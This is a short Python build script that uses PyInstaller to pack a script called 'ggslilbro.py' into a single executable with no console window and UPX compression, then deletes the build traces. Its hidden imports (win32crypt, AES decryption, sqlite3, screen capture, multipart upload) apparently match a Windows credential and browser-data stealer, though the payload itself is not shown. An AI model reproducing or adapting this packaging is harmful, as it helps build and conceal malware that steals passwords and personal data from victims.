import subprocess
import os
import shutil

filename = "ggslilbro"
icon = ""
subprocess.run(["python", "-m", "PyInstaller",
                                "--onefile", "--clean", "--noconsole",
                                "--upx-dir=./tools", "--distpath=./",
                                "--hidden-import", "base64",
                                "--hidden-import", "ctypes",
                                "--hidden-import", "json",
                                "--hidden-import", "re",
                                "--hidden-import", "time",
                                "--hidden-import", "subprocess",
                                "--hidden-import", "sys",
                                "--hidden-import", "sqlite3",
                                "--hidden-import", "requests_toolbelt",
                                "--hidden-import", "psutil",
                                "--hidden-import", "PIL",
                                "--hidden-import", "PIL.ImageGrab",
                                "--hidden-import", "Cryptodome",
                                "--hidden-import", "Cryptodome.Cipher",
                                "--hidden-import", "Cryptodome.Cipher.AES",
                                "--hidden-import", "win32crypt",
                                "-i", "NONE", f"./{filename}.py"])
cleans_dir = {'./__pycache__', './build'}
cleans_file = {f'./{filename}.spec'}

for clean in cleans_dir:
    try:
        if os.path.isdir(clean):
            shutil.rmtree(clean)
    except Exception as e:
        pass
        continue
for clean in cleans_file:
    try:
        if os.path.isfile(clean):
            os.remove(clean)
    except Exception as e:
        pass
        continue
